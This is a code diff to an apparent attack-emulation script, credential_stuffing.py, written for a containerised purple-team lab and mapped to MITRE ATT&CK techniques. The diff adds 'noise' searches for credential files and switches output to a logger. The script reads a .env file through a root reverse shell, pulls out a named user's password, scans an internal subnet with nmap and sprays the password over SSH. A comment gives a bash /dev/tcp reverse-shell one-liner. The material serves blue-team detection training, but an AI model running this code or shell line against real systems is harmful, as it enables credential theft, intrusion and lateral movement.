@@ -3,6 +3,8 @@ import shlex
 import socket
 import time
 
+from chainlog import log
+
 # =============================================================================
 # credential_stuffing.py — Discover internal SSH hosts + spray john's password
 # MITRE ATT&CK:
@@ -27,6 +29,19 @@ INTERNAL_SUBNET  = "10.30.0.0/24"
 TARGET_USERNAME  = "john.stravidis"
 SSH_PORT         = 22
 SCAN_OUTPUT_FILE = "/tmp/cs-scan.gnmap"
+
+# Noise file patterns searched before the real .env read (T1552.001).
+# Each tuple is (filename, list_of_dirs_to_search).  All searches are
+# expected to come up empty — the point is to generate observable events in
+# the scenario log and the apache shell history that a blue team can correlate.
+_NOISE_FILE_PATTERNS = [
+    ("passwords.txt",   ["/home", "/root", "/tmp", "/var/www", "/opt"]),  # /var/www: web-app credential dumps
+    ("secrets.json",    ["/home", "/root", "/tmp", "/var/www", "/opt"]),  # /var/www: web-app credential dumps
+    ("config.backup",   ["/home", "/root", "/tmp", "/etc",     "/opt"]),  # /etc: sysadmin backup destination
+    ("credentials.txt", ["/home", "/root", "/tmp",             "/opt"]),
+    (".passwd",         ["/home", "/root",                     "/opt"]),
+    ("db_password.txt", ["/home", "/root",                     "/opt"]),
+]
 
 # Hosts to exclude from the spray attempt — pure infrastructure addresses
 # that would noise up the log without ever serving sshd-on-22 for `john`:
@@ -93,6 +108,47 @@ def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
     return None
 
 
+def _search_noise_files(shell):
+    """Search for common sensitive file patterns via the root shell.
+
+    All searches are expected to return nothing — the function exists purely
+    to generate log-visible noise events (T1552.001) that a blue team can
+    observe when analysing the scenario.  The log lines and the `find`
+    commands sent through the shell both appear in scenario logs and apache
+    shell history respectively.
+
+    Matches are detected via a `-printf` marker rather than "any output":
+    the root reverse shell echoes a PS1 prompt (and, on some shells, the
+    command itself) into every `_run_remote` capture, so a plain emptiness
+    check would treat that prompt noise as a hit and fire the `[?]` branch on
+    every pattern.  Only lines carrying the `CS_NOISE_HIT` marker count as
+    real finds.
+    """
+    log("[*] Expanding credential search to common sensitive file patterns...")
+    any_hits = False
+    for filename, dirs in _NOISE_FILE_PATTERNS:
+        search_dirs = " ".join(dirs)
+        cmd = (
+            f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
+            f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
+        )
+        out = _run_remote(shell, cmd, timeout=10)
+        hits = [
+            line[len("CS_NOISE_HIT "):]
+            for line in out.splitlines()
+            if line.startswith("CS_NOISE_HIT ")
+        ]
+        if hits:
+            any_hits = True
+            log(f"[?] Unexpected find for {filename!r}: {', '.join(hits)}")
+        else:
+            log(f"[-] {filename!r} not found in {search_dirs}")
+    if any_hits:
+        log("[*] Noise search complete — unexpected file(s) noted above")
+    else:
+        log("[*] Noise search complete — no additional credential files discovered")
+
+
 def _parse_gnmap_hosts(gnmap_text):
     """Return a list of IPs whose grepable-nmap line shows port 22/open."""
     hosts = []
@@ -117,24 +173,26 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
         scanned_hosts — list of internal hosts found with open :22
         successes     — list of (host, user) pairs sshpass authenticated to
     """
-    print("\n[*] Starting credential stuffing (host discovery + password spray)...")
+    log("\n[*] Starting credential stuffing (host discovery + password spray)...")
 
     # ------------------------------------------------------------------
     # Phase 1 — Credentials in files (T1552.001)
+    # Noise searches first (always fail), then the real .env read.
     # ------------------------------------------------------------------
-    print(f"[*] Reading {ENV_FILE_PATH} on apache...")
+    _search_noise_files(root_shell)
+    log(f"[*] Reading {ENV_FILE_PATH} on apache...")
     env_blob = _run_remote(root_shell, f"cat {ENV_FILE_PATH}")
     password = _extract_password(env_blob)
     if not password:
-        print(f"[-] No usable password variable found in {ENV_FILE_PATH}")
-        print(f"[?] File contents: {env_blob!r}")
+        log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
+        log(f"[?] File contents: {env_blob!r}")
         return {"john_ip": None, "john_password": None, "scanned_hosts": [], "successes": []}
-    print(f"[+] Recovered credential: {target_user} / {password}")
+    log(f"[+] Recovered credential: {target_user} / {password}")
 
     # ------------------------------------------------------------------
     # Phase 2 — Network discovery (T1018 / T1046)
     # ------------------------------------------------------------------
-    print(f"[*] Scanning {subnet} for live SSH hosts (nmap from apache)...")
+    log(f"[*] Scanning {subnet} for live SSH hosts (nmap from apache)...")
     scan_cmd = (
         f"nmap -Pn -n -p {SSH_PORT} --open "
         f"-oG {SCAN_OUTPUT_FILE} {subnet} >/dev/null && "
@@ -143,15 +201,15 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
     scan_out = _run_remote(root_shell, scan_cmd, timeout=60)
     discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
     if not discovered:
-        print(f"[-] No SSH hosts discovered on {subnet}")
+        log(f"[-] No SSH hosts discovered on {subnet}")
         _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
         return {"john_ip": None, "john_password": password, "scanned_hosts": [], "successes": []}
-    print(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")
+    log(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")
 
     # ------------------------------------------------------------------
     # Phase 3 — Credential stuffing (T1110.004 / T1021.004)
     # ------------------------------------------------------------------
-    print(f"[*] Spraying {target_user} credentials across {len(discovered)} host(s)...")
+    log(f"[*] Spraying {target_user} credentials across {len(discovered)} host(s)...")
     successes = []
     for host in discovered:
         attempt = (
@@ -168,10 +226,10 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
         )
         out = _run_remote(root_shell, attempt, timeout=15)
         if "uid=" in out and target_user in out:
-            print(f"[+] {host:<14} {target_user}:{password}  → AUTH OK")
+            log(f"[+] {host:<14} {target_user}:{password}  → AUTH OK")
             successes.append((host, target_user))
         else:
-            print(f"[-] {host:<14} {target_user}:{password}  → denied")
+            log(f"[-] {host:<14} {target_user}:{password}  → denied")
 
     # ------------------------------------------------------------------
     # Phase 4 — Cleanup + return
@@ -179,7 +237,7 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
     _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
 
     if not successes:
-        print("[-] Credential stuffing did not authenticate on any host")
+        log("[-] Credential stuffing did not authenticate on any host")
         return {
             "john_ip": None,
             "john_password": password,
@@ -188,7 +246,7 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
         }
 
     john_ip = successes[0][0]
-    print(f"[+] Credential stuffing successful! {target_user} reachable at {john_ip}")
+    log(f"[+] Credential stuffing successful! {target_user} reachable at {john_ip}")
     return {
         "john_ip": john_ip,
         "john_password": password,
@@ -202,7 +260,7 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
 # Then in another terminal, on apache:
 #   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
-    print("[*] Test mode — waiting for root shell on port 5555")
+    log("[*] Test mode — waiting for root shell on port 5555")
 
     test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -211,9 +269,9 @@ if __name__ == "__main__":
 
     try:
         root_shell_sock, addr = test_server.accept()
-        print(f"[+] Root shell received from {addr[0]}")
+        log(f"[+] Root shell received from {addr[0]}")
     finally:
         test_server.close()
 
     result = run(root_shell_sock)
-    print(f"\n[*] Result: {result}")
+    log(f"\n[*] Result: {result}")
